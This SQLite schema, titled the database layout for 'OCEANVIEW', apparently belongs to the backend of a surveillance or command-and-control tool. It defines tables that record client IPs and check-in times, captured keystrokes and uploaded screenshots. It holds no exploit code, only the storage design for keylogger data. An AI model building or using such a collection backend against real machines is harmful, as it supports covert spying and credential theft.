-- The database layout for OCEANVIEW
-- Micah Martin

-- Keep track of arbitrary information sent up by the host
CREATE TABLE `data` (
	`ip`    TEXT,
	`name`  TEXT,
	`data`	TEXT,
	PRIMARY KEY(`ip`, `name`)
) WITHOUT ROWID;

-- These are the IPs that we know about with last checkin time
CREATE TABLE `timestamps` (
	`ip`   TEXT,
	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
        PRIMARY KEY(`ip`)
) WITHOUT ROWID;


-- Keystoke data that we have captured
CREATE TABLE `keystrokes` (
	`ip`        TEXT,
        `keystroke` TEXT,
	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
        PRIMARY KEY(`ip`, `keystroke`)
) WITHOUT ROWID;

-- Store screenshots sent up from the client
CREATE TABLE `screencaptures` (
	`ip`        TEXT,
        `filename`  TEXT,
	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
        PRIMARY KEY(`ip`, `filename`)
) WITHOUT ROWID;
